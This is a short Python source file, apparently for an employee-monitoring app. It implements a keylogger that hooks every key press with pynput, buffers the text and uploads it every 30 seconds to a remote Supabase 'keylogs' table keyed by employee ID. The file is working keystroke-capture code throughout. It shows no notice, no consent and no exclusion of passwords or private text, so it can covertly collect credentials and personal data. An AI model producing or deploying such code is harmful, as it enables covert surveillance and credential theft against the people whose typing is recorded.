import time
import socket
import asyncio
from pynput import keyboard
from supabase import Client

class KeyloggerService:
    def __init__(self, supabase: Client, employee_id: str):
        self.supabase = supabase
        self.employee_id = employee_id
        self.buffer = []
        self.last_flush = time.time()
        self.flush_interval = 30  # seconds

    def on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.enter:
                char = '\n'
            elif key == keyboard.Key.backspace:
                char = '[BS]'
            else:
                char = f'[{key.name}]'
        
        self.buffer.append(char)

    async def start(self):
        # Listener starts in a non-blocking way
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        
        while True:
            await asyncio.sleep(1)
            if time.time() - self.last_flush > self.flush_interval:
                await self.flush()

    async def flush(self):
        if not self.buffer:
            self.last_flush = time.time()
            return

        text_block = "".join(self.buffer)
        self.buffer = []  # Clear buffer
        self.last_flush = time.time()

        try:
            self.supabase.table("keylogs").insert({
                "employee_id": self.employee_id,
                "content": text_block
            }).execute()
            print("Keylogs flushed successfully.")
        except Exception as e:
            print(f"Error flushing keylogs: {e}")
            # In a real app, we might restore the buffer or save to local file
